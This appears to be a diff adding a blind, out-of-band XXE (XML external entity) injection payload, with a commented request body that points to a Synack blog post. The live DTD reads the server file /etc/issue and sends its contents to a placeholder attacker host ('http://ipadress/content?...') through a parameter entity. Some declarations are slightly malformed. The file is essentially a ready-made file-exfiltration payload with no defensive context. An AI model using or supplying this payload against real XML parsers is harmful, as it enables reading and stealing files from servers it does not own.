@@ -1,0 +1,16 @@
+<!--  https://www.synack.com/blog/a-deep-dive-into-xxe-injection/ 
+This should be sent with the request.
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test[
+<!ENTITY % dtd system "file_hosted_inthe_cloud"
+
+%dtd;]>
+<test>
+<email>email@gmail.com</email>
+<password> &extern; </password>
+</test>
+-->
+
+<!ENTITY % file system "file:///etc/issue">
+<!ENTITY %p2 "<!ENTITY extern system 'http://ipadress/content?%file;'>"
+%p2
